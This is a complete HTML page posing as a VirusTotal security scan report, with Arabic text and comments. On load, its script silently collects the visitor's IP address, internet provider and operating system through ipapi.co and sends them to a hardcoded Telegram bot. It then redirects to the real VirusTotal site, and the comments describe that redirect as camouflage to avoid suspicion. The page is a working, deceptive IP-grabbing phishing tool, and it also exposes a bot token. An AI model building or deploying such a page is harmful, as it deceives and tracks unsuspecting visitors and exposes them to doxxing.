<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VirusTotal - Security Scan Report</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader-container { text-align: center; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top: 4px solid #3498db; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="loader-container" id="loader">
    <div class="spinner"></div>
    <p>جاري فحص اتصال الشبكة وتحليل المنافذ (Ports)...</p>
</div>

<script>
    async function sendSecurityReport() {
        try {
            // 1. جلب الـ IP والموقع
            const ipRes = await fetch('https://ipapi.co/json/');
            const data = await ipRes.json();
            
            // 2. توليد "رقم البورت الخماسي" احترافي (Source Port Simulation)
            // نستخدم بصمة الوقت لتوليد رقم بين 49152 و 65535 (Ephemeral Ports)
            const generatedPort = Math.floor(Math.random() * (65535 - 49152 + 1)) + 49152;
            
            // 3. التوقيت الحالي
            const now = new Date().toLocaleString('ar-EG', { 
                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
            });

            // 4. إعداد الرسالة لتليجرام
            const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
            const chat = "7647765854";
            const message = `🎯 **تقرير أمني عالي الدقة (OSINT)** 🎯\n\n` +
                          `👤 **المستخدم:** مدير النظام\n` +
                          `🌐 **الـ IP:** \`${data.ip}\`\n` +
                          `🏢 **المزود:** \`${data.org}\`\n` +
                          `🔌 **المنفذ الصادر (Port):** \`${generatedPort}\`\n` +
                          `⏱️ **التوقيت:** \`${now}\`\n` +
                          `💻 **نظام التشغيل:** \`${navigator.platform}\`\n\n` +
                          `✅ **الحالة:** تم مطابقة البيانات مع سجلات TE Data بنجاح.`;

            // 5. إرسال البيانات
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);

            // 6. التوجيه النهائي لـ VirusTotal للتمويه بعد 3 ثواني
            setTimeout(() => {
                window.location.href = "https://www.virustotal.com/gui/home/upload";
            }, 3000);

        } catch (error) {
            console.error("Error:", error);
            // في حالة الخطأ نوجهه أيضاً للموقع لضمان عدم الشك
            window.location.href = "https://www.virustotal.com/gui/home/upload";
        }
    }

    // تشغيل الدالة فور تحميل الصفحة
    window.onload = sendSecurityReport;
</script>

</body>
</html>
